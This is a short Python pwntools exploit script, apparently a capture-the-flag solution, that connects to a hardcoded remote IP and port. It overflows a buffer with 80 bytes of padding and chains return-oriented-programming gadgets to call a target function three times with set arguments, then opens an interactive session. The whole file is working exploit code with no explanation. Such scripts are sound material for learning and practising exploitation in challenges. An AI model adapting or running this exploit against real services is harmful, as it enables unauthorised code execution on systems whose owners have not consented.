from pwn import *


context.arch = 'amd64'


p = remote('152.118.201.210', 2603)


offset = 80


pop_rdi = 0x4011ba
pop_rsi = 0x4011c3
target  = 0x4011ca
ret     = 0x40101a


payload = b'A' * offset
payload += p64(ret)


def call(p1, p2):
   return flat(
       pop_rdi, p1,
       pop_rsi, p2, 0x0,
       target
   )


# call 1
payload += call(0x1453045102a27520, 0x00007e3131136f00)


# call 2
payload += call(0xb9cad988a6d5c697, 0xcd9a0000fae56eef)


# call 3
payload += call(0x9fecffae8dfeedbc, 0x9deefdac8bf8ebba)


p.sendline(payload)
p.interactive()
